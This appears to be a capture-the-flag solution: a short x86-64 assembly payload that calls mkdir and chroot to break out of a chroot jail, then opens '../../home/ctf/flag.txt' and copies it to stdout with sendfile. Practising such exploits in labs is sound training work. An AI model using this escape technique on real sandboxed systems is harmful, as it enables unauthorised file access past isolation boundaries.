
.section .text
.globl _start
_start:
    .intel_syntax noprefix
    mov rax, 0x53
    lea rdi, [rip + newdir]
    mov rsi, 755
    syscall

    mov rax, 0xA1
    lea rdi, [rip + newdir]
    syscall

    mov rax, 2
    lea rdi, [rip + flag]
    mov rsi, 0
    mov rdx, 755
    syscall

    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov r10, 0x50
    syscall
newdir: 
    .asciz "/newroot"
flag:
    .asciz "../../home/ctf/flag.txt"

